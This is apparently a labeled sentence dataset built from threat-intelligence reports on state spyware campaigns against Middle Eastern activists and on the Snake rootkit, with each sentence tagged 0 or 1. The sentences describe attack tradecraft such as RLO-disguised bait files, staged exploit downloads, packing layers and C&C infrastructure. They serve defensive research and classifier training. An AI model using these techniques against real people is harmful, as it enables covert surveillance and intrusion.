Researchers and security professionals have already profiled many of these RATs , including DarkComet [ , ] , Black- shades Remote Controller , Xtreme RAT , njRAT , and ShadowTech .	0
Some are available for purchase by any- one , in contrast to '' government only '' FinSpy and RCS .	0
For ex- ample , Xtreme RAT retails for e350 , while a version of Black- shades lists for e40 .	0
Others , like DarkComet , are free .	0
We have also observed cracked versions of these RATs on Arabic- language hacker forums , making them available with little ef- fort and no payment trail .	0
While the RATs are cheaper and less sophisticated than FinSpy and RCS , they share the same ba- sic functionality , including screen capture , keylogging , remote monitoring of webcams and microphones , remote shell , and file exfiltration .	1
In the most common attack sequence we observed , illus- trated with three examples in Figure 3 , the attacker seeds mal- ware via private chat messages , posts in opposition-controlled social media groups , or e-mail .	1
These techniques often limit the world-visibility of malicious files and links , slowing their detection by common AV products .	1
Typically , targets receive either ( 1 ) a PE in a .zip or .rar , ( 2 ) a file download link , or ( 3 ) a link that will trigger a drive-by download .	1
The messages usually include text , often in Arabic , that attempts to persuade the target to execute the file or click the link .	1
The first attacks in Figure 3 date to 2012 , and use bait files with a DarkComet RAT payload .	1
These attacks share the same C & C , 216.6.0.28 , a Syrian IP address belonging to the Syr- ian Telecommunications Establishment , and publicly reported as a C & C of Syrian malware since February 2012 .	1
The first bait file presents to the victim as a PDF containing infor- mation about a planned uprising in Aleppo .	1
In fact the file is a Windows Screensaver ( .scr	1
) that masquerades as a PDF using Unicode RLO , rendering a name such as '' .fdp.scr	1
'' dis- play to the victim as '' .rcs.pdf	0
.	0
'' The second bait file is a dummy program containing DarkComet while masquerading as a Skype call encryption program , playing to opposition para- noia about government backdoors in common software .	1
The third attack in Figure 3 , observed in October 2013 , entices tar- gets with e-mails purporting to contain or link to videos about the current conflict , infecting victims with Xtreme RAT , and using the C & C tn1.linkpc.net .	1
For seeding , the attackers typically use compromised ac- counts ( including those of arrested individuals ) or fake iden- tities masquerading as pro-opposition .	1
Our illustration shows in abstract terms the use of Victim A 's account to seed mal- ware ( '' Aleppo Plan '' ) via ( say ) Skype messages to Victim ( s ) Bn .	0
In the cases of Opp .	0
Member C and NGO Worker D ( here , actual victims , not abstract ) , targeting was by e-mail from domains apparently belonging to opposition groups , in- dicating a potential compromise .	1
One domain remains active , hosting a website of the Salafist Al-Nusra front , while the other appears dormant .	0
Opp . Member C received a malicious file as an e-mail attachment , while NGO Worker D was sent a shortened link ( url [ . ] no/Uu5 ) to a download from a directory of Mrconstrucciones [ . ] net , a site that may have been com- promised .	1
Both attacks resulted in an Xtreme RAT infection .	1
Interestingly , in the case of the fake Skype encryption the deception extended to a YouTube video from '' IT Se- curity Lab '' demonstrating the program 's purported ca- pabilities , as well as a website promoting the tool , skype- encryption.sytes.net .	0
The attackers also constructed a ba- sic , faux GUI for their '' Encryption '' program ( see Figure 4 ) .	0
The fake GUI has a number of non-functional buttons like '' En- crypt '' and '' DeCrypt , '' which generate fake prompts .	0
While dis- tracted by this meaningless interaction , the victim 's machine is infected with DarkComet 3.3 [ , ] .	1
Anecdotally , campaign volume appears to track significant events in the ongoing conflict .	0
For example , campaigns dwin- dled and then rebounded within hours after Syria 's 2012 Inter- net shutdown .	0
Similarly , activity observed by the authors also dwindled prior to expectation of US-led military action against Syrian government targets in September 2013 .	0
Once this option appeared to be off the table , the volume of new samples and campaigns we observed again increased , includ- ing the recent targeting of NGO workers per Figure 3 .	0
We are aware of only a negligible number of cases of the opposition using similar RATs against Syrian Government supporters , al- though evidence exists of other kinds of electronic attacks by third parties .	0
The logistics and activities of Syria 's numerous opposition groups are intentionally concealed from public view to protect both their efficacy , and the lives of people participating in them .	0
Nevertheless , Syrian opposition members are generally familiar with stories off digital compro- mises of high-profile figures , including those entrusted with the most sensitive roles , as well as rank-and-file members .	0
Com- promise of operational security poses a documented threat to life both for victims of electronic compromise , and to family members and associates .	0
The Syrian conflict is ongoing , making it difficult to assem- ble comprehensive evidence of linkages between government actors and malware campaigns .	0
Moreover , many individuals whose identities have been compromised are in prison or oth- erwise disappeared , and thus unable to relate the evidence pre- sented to them during interrogation .	0
Still , strong circumstantial evidence links the use of RATs , phishing , and government ac- tivity , which we briefly summarize here : ( 1 ) many Syrians have recounted to journalists and the authors how interrogators con- fronted them with material from their computers .	0
For example : The policeman told me , '' Do you remember when you were talking to your friend and you told him you had something wrong [ sic ] and paid a lot of money ? At that time we were taking information from your laptop .	0
'' ( 2 ) Syrian activists have supplied cases to international journal- ists , where arrests are quickly followed by the social me- dia accounts of detained individuals seeding malware to contact lists ( Figure 3 ) .	0
( 3 ) Finally , despite the notoriety of the attack campaigns , including mention of C & C IPs in international me- dia , the Syrian government has made no public statements about these campaigns nor acted to shut down the servers .	0
Beyond the ongoing challenges of attribution , these malware campaigns have a tangible impact on the Syrian opposition , and generally align with the interests of the Syrian government's propaganda operations .	0
The case of Abdul Razzaq Tlass , a leader in the Free Syrian Army , is illustrative of the potential uses of such campaigns .	0
In 2012 a string of videos emerged showing Tlass sexting and engaged in lewd activity in front of a webcam .	0
While he denied the videos , the harm to his rep- utation was substantial and he was eventually replaced .	0
While the UAE has experienced no recent uprising or politi- cal unrest , it has nevertheless cracked down on its opposition , concurrent with the Arab Spring .	0
The first attacks we observed in the UAE involved a government-grade '' lawful interception '' trojan known as Re- mote Control System ( RCS ) , sold by the Italian company Hack- ing Team .	1
The associated C & C server indicated direct UAE government involvement .	0
Over time , we stopped receiving RCS samples from UAE targets , and instead observed a shift to the use of off-the-shelf RATs , and possible involvement of cyber-mercenary groups .	0
However , poor attacker operational security .allowed	0
us to link most observed attacks together .	0
UAE activist Ahmed Mansoor ( per Figure 5 ) , impris- oned from April to November 2011 after signing an online pro- democracy petition , received an e-mail purportedly from '' Arabic Wikileaks '' in July 2012 .	0
He opened the associated at- tachment , '' veryimportant.doc , '' and saw what he described as '' scrambled letters '' .	0
He forwarded us the e-mail for investiga- tion .	0
The attachment exploited CVE-2010-3333 , an RTF pars- ing vulnerability in Microsoft Office .	0
The document did not contain any bait content , and part of the malformed RTF that triggered the exploit was displayed in the document .	0
The exploit loaded shellcode that downloaded a second stage from ar-24.com , which in turn downloaded spyware from ar-24.com .	1
We denote this combination as the 3-Stage Ex- ploit Kit in Figure 5 .	0
The C & C server also ran on ar-24.com .	1
When we ob- tained the sample in July 2012 , ar-24.com resolved to an IP address on Linode , a hosting provider .	0
Three months later , it resolved to a UAE address belonging to the Royal Group , an organization linked to the UAE government ; it is chaired by Sheikh Tahnoon bin Zayed Al-Nayhan , a member of the UAE ruling family and a son of the founder of the UAE .	0
Identification as RCS : We identified strings in memory that matched those in a Symantec analysis of RCS ( also known as DaVinci or Crisis ) , a product of the Italian com- pany Hacking Team .	0
We also located a structurally sim- ilar Word document via VirusTotal .	0
The document used the same exploit and attempted to download a second stage from rcs-demo.hackingteam.it , which was unavailable at the time of testing .	1
Analysis of capabilities : RCS has a suite of functionality largely similar to FinSpy .	0
One difference was in the vectors used to install the spyware .	1
We located additional samples ( see § 5 ) , some of which were embedded in a .jar file that installs an OS-appropriate version of RCS ( Windows or OSX ) , option- ally using an exploit .	1
If embedded as an applet , and no exploit is present , Java displays a security warning and asks the user whether they authorize the installation .	0
We also saw instances of the 3-Stage Exploit Kit where the first stage contained a Flash exploit ; in some cases , we could obtain all stages and confirm that these installed RCS .	1
Some samples were packed with the MPress packer , and some Windows samples were obfuscated to look like the PuTTY SSH client .	1
Another difference is in persistence .	0
For example , the RCS sample sent to Ahmed adds a Run registry key , whereas the FinSpy samples used in Bahrain overwrite the hard disk 's boot sector to modify the boot process ; the spyware is loaded be- fore the OS , and injects itself into OS processes as they start .	1
The RCS samples we examined also had the ability to propa- gate to other devices , including into inactive VMWare virtual machines by modifying the disk image , onto USB flash drives , and onto Windows Mobile phones .	1
We did not observe similar capabilities in the FinSpy samples we examined .	0
Exploitation of captured data : When Ahmed Mansoor re- ceived the RCS document , he opened it , infecting his computer ( Figure 5 ) .	0
Ahmed subsequently noted several suspicious ac- cesses to his GMail account using IMAP .	1
Even after he changed his password , the accesses continued .	1
While corresponding with Ahmed on his compromised account , an author of this pa- per discovered that the attackers had installed an application- specific password in Ahmed 's GMail account , a secondary password that they apparently used to access his account even after he changed his main password .	1
The suspicious accesses stopped after removal of the application-specific password .	0
Two weeks after this correspondence with Ahmed , one of us ( Author in Figure 5 ) received a targeted e-mail with a link to a file hosted on Google Docs containing a commercial off-the- shelf RAT , Xtreme RAT .	1
The e-mail was sent from the UAE's timezone ( as well as of other countries ) and contained the terms '' veryimportant '' and '' wikileaks '' , just like in the e-mail re- ceived by Ahmed .	0
The instance of Xtreme RAT sent to Author used owner.no-ip.biz for its C & C , one of the domains men- tioned in a report published by Norman about a year-long cam- paign of cyberattacks on Israeli and Palestinian targets carried out by a group that Norman was unable to identify .	1
Three months after Author was targeted , Ahmed received an e-mail containing an attachment with Xtreme RAT that talked to the same C & C server ( Figure 5 ) , suggesting that the attackers who infected Ahmed with RCS may have provided a list of interest- ing e-mail addresses to another group for further targeting .	1
Possible consequences : Shortly after he was targeted , Ahmed says he was physically assaulted twice by an attacker who appeared able to track Ahmed 's location .	0
He also re- ports that his car was stolen , a large sum of money disappeared from his bank account , and his passport was confiscated .	0
He believes these consequences are part of a government in- timidation campaign against him , but we did not uncover any direct links to his infection .	0
( Interestingly , spyware subse- quently sent to others has used bait content about Ahmed .	1
) Further attacks : In October 2012 , UAE Journalist A and Human Rights activist B ( per Figure 6 ) forwarded us suspi- cious e-mails they had received that contained a Word docu- ment corresponding to the first stage of 3-Stage Exploit Kit ( Figure 5 ) .	1
The attachment contained an embedded Flash file that exploited a vulnerability fixed in Adobe Flash 11.4 , loading shell code to download a second stage from faddeha.com .	1
We were unable to obtain the second stage or the ultimate pay- load , as the website was unavailable at the time of testing .	0
However , the exploit kit appears indicative of Hacking Team involvement .	0
A page on faddeha.com found in Google's cache contained an embedded .jar	0
with the same applet class ( WebEnhancer ) as those observed in other .jar	0
files that we found to contain RCS .	0
We found a file that VirusTotal had downloaded from faddeha.com , which appeared to be a re- mote access toolkit known as SpyNet , available for general pur- chase for 50 Euros .	0
The SpyNet sample communicated with the C & C hamas.sytes.net .	1
SpyNet Packing : We found another instance of the first stage of the 3-Stage Exploit Kit on VirusTotal .	0
The exploit downloaded a second stage , which in turn downloaded a sam- ple of SpyNet from maile-s.com .	1
This sample of SpyNet communicated with the same C & C hamas.sytes.net .	1
The sample was packed using ASProtect .	0
When run , the sample unpacks a compiled Visual Basic project that loads , via the RunPE method , an executable packed with UPX .	1
Finally , this executable unpacks SpyNet .	0
SpyNet 's GUI only offers an option to pack with UPX , suggesting that the attack- ers specially added the other layers of packing .	0
In some cases , the Visual Basic project bears the name NoWayTech , which appears to be an underground RunPE tool , while others are named SpyVisual , which we have been unable to trace to any public underground tools , and thus also may reflect customiza- tion by the attacker .	0
The SpyVisual projects contain the string c : \Users\Zain\AppData\Local\Temp\OLE1EmbedStrm.wav , which we used as the fingerprint VB Packer in Figure 6 .	0
Cedar Key attack : The same VB Packer was used in an attack on Relative of political detainee D and H.R .	0
activist E in Figure 6 .	0
These individuals received e-mails containing a link to a web page hosted on cedarkeyrv.com impersonat- ing YouTube .	1
Loading the page greeted the target with '' Video loading please wait .	0
.	0
.	0
'' The page redirected to a YouTube video a few seconds later , but first loaded a Java exploit -a known vulnerability with no patch at the time that the e-mails were sent .	1
Oracle released a patch 12 hours after activists began receiving these links .	0
The cedarkeyrv.com domain is associated with an RV park in Cedar Key , Florida .	0
The website 's hosting company told us that the site had apparently suffered a compromise , but did not have further details .	0
The exploit used in the attack appears to have been origi- nally posted by a Kuwaiti user , njq8 , on an Arabic-language exploit sharing site .	0
We contacted njq8 , who told us that he had obtained the exploit elsewhere and modified it prior to posting .	0
The attack downloaded an instance of SpyNet from isteeler.com ( which from our inspection did not appear to have any legitimate content ) , which used the C & C storge.myftp.org .	1
This same C & C occurred in an- other attack ( Figure 6 ) targeting Relative of political detainee D ; in that case , the payload was a freely-available RAT known as njRAT , written by the same njq8 as the exploit-poster dis- cussed above .	0
However , we did not find any other evidence suggesting njq8 's involvement in either attack .	0
More SpyNet attacks : The domain hamas.sytes.net , which we previously saw used by two SpyNet sam- ples , resolved to 67.205.79.177 .	0
Historically , dreems.no-ip.ca also resolved to this address .	0
An unidentified dropper using this C & C targeted Journalist F ; a SpyNet attack on Relative of political detainee D also used this C & C .	1
In that latter case , the sample arrived via e-mail in a .rar attachment that contained an .scr file disguised as a Word document .	1
The .scr file was a self-extracting archive that decompressed and ran both the bait document and the payload .	1
The SMTP source of the e-mail was webmail.upload.bz .	0
Appin : In early 2013 UAE H.R .	0
activist E forwarded nu- merous documents that included a particular CVE-2012-0158 exploit for Microsoft Word .	0
In all , these totaled 17 distinct hashes of documents , and 10 distinct hashes of payloads ( some documents that differed in their hash downloaded the same pay- load ) .	1
The exploits primarily downloaded instances of SpyNet from upload.bz , which for the most part communicated with C & C at sn.all-google.com .	1
This domain was also used for C & C in other attacks , including that on Journalist C. Two of the other CVE-2012-0158 exploits down- loaded DarkComet from www.getmedia.us and www.technopenta.com after posting system infor- mation to random123.site11.com .	1
All three domains match those used by an Indian cybermercenary group said to be linked to Appin Security Group .	0
The former two domains hosted content other than spyware ( i.e. , they may have been compromised ) .	0
We alerted the owner of www.getmedia.us , who removed the payloads .	0
The samples we received afforded us an opportunity to em- pirically characterize the use of FinFisher and Hacking Team around the world , enabling us to assess their prevalence , and identify other country cases that may warrant future investiga- tion .	0
We analyzed the samples and the behavior of their C & C servers to develop indicators ( fingerprints ) for how the servers respond to certain types of requests .	0
We then scanned the full Internet IPv4 address space ( '' /0 '' ) for these , along with prob- ing results found by past scans .	0
In many cases we do not release the full details of our fingerprints to avoid compromising what may be legitimate investigations .	0
Identifying and linking servers : We developed a number of fingerprints for identifying FinSpy servers using HTTP- based probing as well as FinSpy 's custom TLV-based proto- col. We leveraged quirks such as specific non-compliance with RFC 2616 , responses to certain types of invalid data , and the presence of signatures such as the bizarre '' Hallo Steffi '' that Guarnieri identified from Bahraini FinSpy C & C servers [ , ] .	0
See Appendix A for details .	0
We then exhaus- tively scanned the Internet looking for matches to these finger- prints .	0
Gamma documentation advertises that an operator of FinSpy can obscure the location of the C & C server ( called the mas- ter ) by setting up a proxy known as a relay .	1
In Spring 2013 we noticed FinSpy servers now issuing 302 Redirects to google.com .	0
However , we noticed anomalies : for ex- ample , servers in India were redirecting to the Latvian ver- sion of Google google.lv .	0
We suspect that the server in India was a relay forwarding to a master in Latvia .	0
Be- cause the master served as a proxy for Google , we could uncover its IP address using a Google feature that prints a user 's IP address for the query '' IP address .	0
'' We created an additional fingerprint based on the proxying behavior and is- sued GET /search ? q=ip+address & nord=1 requests to servers We note some interesting master locations in Table 4 .	0
Server locations : In all , our fingerprints matched 92 dis- tinct IP addresses in 35 different countries .	0
Probing these on 8/8/13 revealed 22 distinct addresses still responding , sited in : Bahrain , Bangladesh , Bosnia and Herzegovina , Estonia , Ethiopia , Germany , Hong Kong , Indonesia , Macedonia , Mex- ico , Romania , Serbia , Turkmenistan , and the United States .	0
We found servers responding to a number of our fingerprints , sug- gesting either that some servers lag in their updates , or a con- certed effort to vary the behavior of FinSpy servers to make detection harder .	0
We found : ( 1 ) 3 IP addresses in ranges registered to Gamma .	0
( 2 ) Servers in 3 IP ranges explicitly registered to govern- ment agencies : Turkmenistan 's Ministry of Communications , Qatar 's State Security Bureau , and the Bulgarian Council of Ministers .	0
( 3 ) 3 additional IP addresses in Bahrain , all in Batelco .	0
( 4 ) Servers in 7 countries with governments classified as '' authoritarian regimes '' by The Economist : Bahrain , Ethiopia , Nigeria , Qatar , Turkmenistan , UAE , Vietnam .	0
Additional FinSpy samples : In parallel to our scanning , we obtained 9 samples of FinSpy by writing YARA rules for the '' malware hunting '' feature of VirusTotal Intelligence .	0
This feature sends us all newly-submitted samples that match our signatures .	0
We located a version of FinSpy that does not use the normal FinSpy handshake , but instead uses a protocol based on HTTP POST requests for communication with the C & C server .	1
This did not appear to be an older or newer ver- sion of the protocol , suggesting that our scan results may not reveal the full scope of FinSpy C & C servers .	0
Perhaps , the HTTP POST protocol was only delivered to a specific Gamma customer to meet a requirement .	0
We began by analyzing the UAE RCS sample from Ahmed and 6 samples obtained from VirusTotal by searching for AV re- sults containing the strings '' DaVinci '' and '' RCS .	0
'' At the time , several AV vendors had added detection for RCS based on a sample analyzed by Dr .	0
Web and the UAE RCS sample sent to Ahmed .	0
We also similarly obtained and analyzed sam- ples of FSBSpy , a piece of malware that can report system information , upload screenshots , and drop and execute more malware .	1
Based on these samples , we devised YARA signa- tures that yielded 23 additional samples of structurally similar malware .	0
Fingerprints : We probed the C & C servers of the RCS and FSBSpy samples , and found that they responded in a distinc- tive way to HTTP requests , and returned distinctive SSL cer- tificates .	0
We searched sources including Shodan , 5 Internet Census service probes , and Critical.IO scanning data for the observed distinctive HTTP behavior .	0
We searched for the dis- tinctive SSL certificates in two Internet Census service probes , and SSL certificate scans from ZMap .	0
We also contacted a team at TU Munich , who applied our fingerprints to their SSL scanning data .	0
Across all of these sources , we obtained 31,345 indicator hits reflecting 555 IP addresses in 48 coun- tries .	0
One SSL certificate returned by 175 of the servers was issued by '' /CN=RCS Certification Authority /O=HT srl , '' apparently referring to the name of the spyware and the company .	0
Servers for 5 of our FSBSpy samples and 2 of our RCS samples re- sponded with this type of certificate .	0
Some servers returned these certificates in chains that in- cluded another distinctive certificate .	0
We found 175 distinct IP addresses ( including the C & C 's for 5 of our FSBSpy samples and 2 of our RCS samples ) responded with this second type of certificate .	0
We devised two more indicators : one that matched 125 IP addresses , including 7 of our FSBSpy samples ' C & C 's , and one that matched 2 IP addresses , in Italy and Kazakhstan .	0
Server locations : On 11/4/13 we probed all of the IP ad- dresses that we collected , finding 166 active addresses match- ing one of our fingerprints in 29 different countries .	0
We sum- marize the top providers and countries in Table 5 .	0
The prevalence of active servers either located in the USA or hosted by Linode is striking , and seems to indicate a pervasive use of out-of-country web hosting and VPS services .	0
In addition , we found : ( 1 ) 3 IP addresses on a /28 named '' HT public subnet '' that is registered to the CFO of Hacking Team .	0
The domain hackingteam.it resolves to an address in this range .	0
( 2 ) An address belonging to Omantel , a majority-state-owned telecom in Oman .	0
This address was un- reachable when we probed it ; a researcher pointed us to an FS- BSpy sample that contained an Arabic-language bait document about Omani poetry , which talked to a C & C in the UK .	1
( 3 ) 7 IP addresses belonging to Maroc Telecom .	0
Moroccan journal- ists at Mamfakinch.com were previously targeted by RCS in 2012 .	0
( 4 ) Overall , servers in 8 countries with governments deemed '' authoritarian regimes '' : Azerbaijan , Kazakhstan , Nigeria , Oman , Saudi Arabia , Sudan , UAE , Uzbekistan .	0
Link to Hacking Team : All active servers match- ing one of our signatures also responded peculiarly when queried with particular ill-formed HTTP requests , respond- ing with '' HTTP1/1 400 Bad request '' ( should be '' HTTP/1.1 '' ) and a body of '' Detected error : HTTP code 400 '' .	0
Googling for this response yielded a GitHub project em-http-server , a Ruby-based webserver .	0
The project 's author is listed as Alberto Ornaghi , a software architect at Hacking Team .	0
We suspect that the Hacking Team C & C server code may incorporate code from this project .	0
Links between servers : We identified many cases where several servers hosted by different providers , and in different countries , returned identical SSL certificates matching our fin- gerprints .	0
We also observed 30 active servers used a global IPID .	0
Only one active server had neither a global IPID nor an SSL certificate matching our fingerprints .	0
We assessed whether servers returning SSL certificates were forwarding to the servers with global IPIDs by inducing bursts of traffic at the former and monitoring the IPID at the latter .	0
For 11 servers , we found that the server 's activity correlated to bursts sent to other servers .	0
We grouped servers by the SSL certificates they returned , and found that each group forwarded to only a sin- gle server , except for one case where a group forwarded to two different IPs ( both in Morocco ) .	1
We also found two groups that forwarded to the same address .	1
There was a 1:1 mapping between the remaining 8 addresses and groups .	0
We refer to a group along with the server ( s ) it forwards to as a server group .	0
We identified several server groups that may be associated with victims or operators in a certain country .	0
Some of these suggest possible further investigation : Turkey : We identified a group containing 20 servers in 9 countries .	0
Two RCS and 5 FSBSpy samples from VirusTo- tal communicated with various servers in the group .	1
The RCS samples also communicated with domains with lapsed registra- tions , so we registered them to observe incoming traffic .	1
We ex- clusively received RCS traffic from Turkish IP addresses .	0
( RCS traffic is identifiable based on a distinctive user agent and URL in POST requests .	0
) A sample of FSBSpy apparently installed from an exploit on a Turkish server talked to one of the servers in this group .	1
We also found server groups containing servers in Uzbek- istan and Kazakhstan ; we found FSBSpy samples on Virus- Total uploaded from these countries that communicated with servers in these groups .	1
In the above cases , save Turkey , the country we have identi- fied is classified as an '' authoritarian regime , '' and may be using Hacking Team products against the types of targets we profile in this paper .	0
In the case of Turkey , there are hints that the tool may be employed against dissidents .	0
Targeted surveillance of individuals conducted by nation-states poses an exceptionally challenging security problem , given the great imbalance of resources and expertise between the victims and the attackers .	0
We have sketched the nature of this problem space as reported to us by targeted individuals in three Middle Eastern countries .	0
The attacks include spyware for ongoing monitoring and the use of '' IP spy '' links to deanonymize those who voice dissent .	1
The attacks , while sometimes incorporating effective so- cial engineering , in general lack novel technical elements .	1
In- stead , they employ prepackaged tools developed by vendors or acquired from the cybercrime underground .	0
This technol- ogy sometimes suffers from what strike us as amateurish mis- takes ( multiple serious errors implementing cryptography , bro- ken protocol messages ) , as does the attackers ' employment of it ( identifying-information embedded in binaries , C & C servers discoverable via scanning or '' Google hacking '' , clusters of at- tack accounts tied by common activity ) .	0
Some of these errors assisted our efforts to assemble strong circumstantial evidence of governmental origins .	0
In addition , we mapped out the global use of two '' governmental '' hacking suites , including identify- ing 11 cases in which they appeared to be used in countries governed by '' authoritarian regimes .	0
'' We aim with this work to inspire additional research efforts addressing the difficult problem of how to adequately protect individuals with very limited resources facing very powerful adversaries .	0
Open questions include robust , practical detection of targeted attacks designed to exfiltrate data from a victim's computer , as well as detection of and defense against novel at- tack vectors , like tampering with Internet connections to insert malware .	0
The task is highly challenging , but the potential stakes are likewise very high .	0
An opposition member , reflecting on gov- ernment hacking in Libya , speculated as to why some users would execute files even while recognizing them as potentially malicious : '' If we were vulnerable we could n't care less .	0
.	0
.	0
we were desperate to get our voices out .	0
.	0
.	0
it was a matter of life or death .	0
.	0
.	0
it was just vital to get this information out .	0
'' This work was supported by the National Science Foundation under grants 1223717 and 1237265 , and by a Citizen Lab Fel- lowship .	0
Any opinions , findings , and conclusions or recom- mendations expressed in this material are those of the authors and do not necessarily reflect the views of the sponsors .	0
The authors would like to thank the following individuals for their help in various aspects of our analysis : Bernhard Am- man , Collin D. Anderson , Brandon Dixon , Zakir Durumeric , Eva Galperin , Claudio Guarnieri , Drew Hintz , Ralph Holz , Shane Huntley , Andrew Lyons , Mark Schloesser , and Nicholas Weaver .	0
Previous work by Guarnieri on scanning for FinSpy servers found that in response to a request such as GET / , the Bahraini FinSpy C & C server returns a response with the string '' Hallo Steffi '' .	0
Guarnieri searched a database of such responses compiled by the Critical.IO Internet scanning project , locating 11 additional servers in 10 countries .	0
We refer to this fingerprint as α1 .	0
Concurrent with this ef- fort , we devised our own fingerprint β1 that tested three as- pects of the handshake between a FinSpy infectee and a Fin- Spy C & C server , which follows a custom TLV-based protocol running on ports such as 22 , 53 , 80 , and 443 .	0
We conducted targeted scanning of several countries using β1 , and also con- firmed Guarnieri 's findings for those servers still reachable af- ter he published his findings .	0
We observed a trend : changes in HTTP response behavior by FinFisher after publication of findings about the software .	0
In July 2012 , for example , after a post about Bahraini FinSpy samples , servers closed the TCP connection in response to a GET / or HEAD / request ( although servers continued to behave consistently with β1 .	0
Other changes followed later in 2012 , including a new response to GET / requests that in- cluded an imperfect copy of an Apache server 's HTTP response ( the Date header used UTC rather than GMT ) .	0
We fingerprinted this error as α2 , and later in 2012 fingerprinted other distinctive behavior in response to GET / requests as α3 .	0
Subsequent scans of /0 for α2 and α3 , and five service probes of the Internet Census for α1 through α3 , located several additional servers .	0
In Feburary 2013 we identified and finger- printed new HTTP response behavior with α4 and modified β1 to produce β2 , which tests only two of the three aspects of the FinSpy handshake ( the third test of β1 was broken when Fin- Spy servers were updated to accept types of invalid data they had previously rejected ) .	0
As of 3/13/13 , all servers that matched any α fingerprint matched β2 .	0
One of the questions which comes up in the months after big security whitepaper disclosures is : where are they now ? In other words , what happened to the operators , tools , and infrastructure which was revealed in the reports , blog-posts , and press interviews .	0
Did they continue on as before , did they re-build the disclosed infrastructure and tools , did they go away and get jobs in another line of work ? In some cases , the disclosure had little , if any impact on the operation .	0
For example , after the McAfee ShadyRAT report in 2011 , there was absolutely no change in the attacks from the group behind this .	0
However , when Mandiant released their APT1 report in 2013 , there was a noticeable reduction in activity from the group – and much of the tools and infrastructure has not been seen since .	0
In the September 2010 issue of Foreign Affairs magazine , former US Deputy Secretary of Defense William J. Lynn discussed a cyber-attack which happened two years previously on the DoD's classified computer networks .	0
Lynn described how a foreign intelligence agency planted malicious code on the networks with the aim of transferring data to servers under their control .	0
The article included the now oft-quoted phrase 'digital beachhead ' to describe what was undoubtedly a significant compromise of US military systems .	0
Further reports in the press kept the story alive in 2011 , but since then this threat has received remarkably little attention .	0
However , the operation behind the attacks has continued with little modification to the tools and techniques , in spite of the widespread attention a few years ago .	0
They use highly sophisticated malware tools to maintain persistent access to their targets .	1
These tools can be used for covert communications in a number of different modes , some of which present significant challenges for traditional security technologies to detect .	1
There are some threats which come and go , whilst there are others which are permanent features of the landscape .	0
In this paper , we describe the tools and techniques of one of the most sophisticated and persistent threats we track .	0
We hope this will help victims identify intrusions and understand their need to improve defences .	0
Cyber security is a collaborative effort – the operation described in this paper again raises the bar for the security community in their efforts to keep up with the attackers in cyber-space .	0
When antivirus back-end classification platforms can not identify a malware family for an analysed malicious sample , they assign generic names , such as '' Trojan Horse '' or '' Agent '' .	0
The variant letters are also assigned automatically , by using hexavigesimal ( or Base26 ) notation .	0
That is , the variant letters are auto-assigned starting from '' A '' , followed with '' B '' , and so on until '' Z '' .	0
Next comes '' AA '' , '' AB '' and so on , until '' ZZ '' .	0
After that , the variant letters start from '' AAA '' , '' AAB '' and so on , until '' ZZZ '' .	0
Back in 2008 an unknown malicious file was discovered and auto-classified as '' Agent.BTZ '' , meaning it was registered as unknown malicious sample # 1,898 in an anti-virus classification system .	0
It was n't given an actual name , only a generic one .	0
Meanwhile , internally the authors behind this malware were using their own naming systems - with specific titles for their file components and projects such as '' snake '' , '' uroburos '' , '' sengoku '' , and '' snark '' used to denote variants of their framework .	0
A recent report from German security company GData described a sample from the '' uroburos '' variant of this framework .	0
Their report revealed the complex nature of this malware family , and showed that the operation behind '' Agent.BTZ '' has continued .	0
As a result of this disclosure , we are also releasing our own technical analysis of the threat , including a timeline of known samples , known Command-and-Control ( C & C ) servers , and other indicators to aid investigators in discovering attacks .	0
Reverse engineering of recent malware samples shows these to be much more advanced variants of Agent.BTZ , though still sharing many similarities and encryption methods with the original .	0
Further investigation allowed us to locate related samples compiled between 2006 and 2014 , and spanning across several distinctive generations .	0
The first section of this report gives an overview of the samples collected , where they were reported and the timelines derived from their analysis .	0
Snake 's architecture turned out to be quite interesting .	0
We have identified two distinct variants , both highly flexible but with two different techniques for establishing and maintaining a presence on the target system .	1
In general , its operation relies on kernel mode drivers , making it a rootkit .	0
It is designed to covertly install a backdoor on a compromised system , hide the presence of its components , provide a communication mechanism with its C & C servers , and enable an effective data exfiltration mechanism .	1
At the same time , Snake exposed a flexibility to conduct its operations by engaging these noticeably different architectures .	0
In the first model , the network communications are carried out from the userland - i.e .	1
the area of the computer system where application software executes .	0
In another model , the network communications are handled by a kernel mode driver - i.e .	1
the area where lower level system code such as device drivers run .	0
The choice of what architecture should be used may depend on a specific target 's environment , allowing the Snake operators to choose the most suitable architecture to be deployed .	1
In both architectures there is a kernel mode driver installed and a usermode DLL injected by the driver into the system processes .	1
In both architectures , there is both 32-bit and 64-bit code involved .	0
In order to distinguish between these architectures , we will call them the usermode-centric and the kernel-centric architectures respectively .	0
The remainder of this report gives a detailed explanation of how the two Snake architectures embed themselves in the target system and communicate with the outside world .	0
We have also provided a set of technical indicators in the Appendix to enable organisations and the security research community to identify compromises .	0
In total we have collected over 100 unique files related to this espionage toolkit .	0
Many of these were submitted to online malware analysis websites by victims and investigators over several years .	0
In many cases the source country information of the submission is available .	0
These allow us to visualise the distribution of countries where this malware has been seen : Whilst this view is likely to only be the tip of the iceberg , it does give us an initial insight into the profile of targets for the Snake operations .	0
Other useful visualisations of the operations come from the compile timestamps .	0
Below is shown a table with a count of the number of files in our sample set from recent years .	0
Two samples compiled in late January 2014 show that this activity is ongoing .	0
Plotting the day of the week in which the samples were compiled shows a now familiar pattern for analysts of modern cyber-attacks .	0
The creators of the malware operate a working week , just like any other professional .	0
The single sample in our set which was compiled on a Saturday is an outlier , but does n't alter the conclusion .	0
Similarly , plotting the hour of the day in which the samples were compiled reveals another human pattern – the working day .	0
This has been adjusted to UTC+4 to show a possible fit to the operators ' local time .	0
The usermode-centric architecture of Snake is known to have been used from 2011 till 2014 , with the most recent sample compiled on January 28 , 2014 .	0
With this architecture , the Snake driver is mainly used to load the DLL module into the usermode processes , and then use that module for the communications .	1
One of the analysed samples exposed multiple debug messages and source control check-in logs .	0
It is not clear why those messages were allowed in the deployed driver - possibly an operational security lapse .	0
However , they give some insight into the internal structure of the source code .	0
For example , the analysed driver gave away the following source file names : The source control check-in log examples , showing the names of the developers to be 'vlad ' and 'gilg ' : It also exposed the project name of this particular variant as 'sengoku ' : Now it 's time to execute the driver and see what it does .	0
When first executed , the driver creates device named \Device\vstor32 with a symbolic link \DosDevices\vstor32 .	1
This device is used for userland/kernel communications .	1
Next , it drops a DLL into the % windows % directory - the DLL is carried in the body of the driver as a binary chunk with XOR 0xAA applied on top of it , so the driver decrypts it first .	1
Depending on the variant , the DLL is dropped either under a random name or a hard-coded name , such as mscpx32n.dll .	1
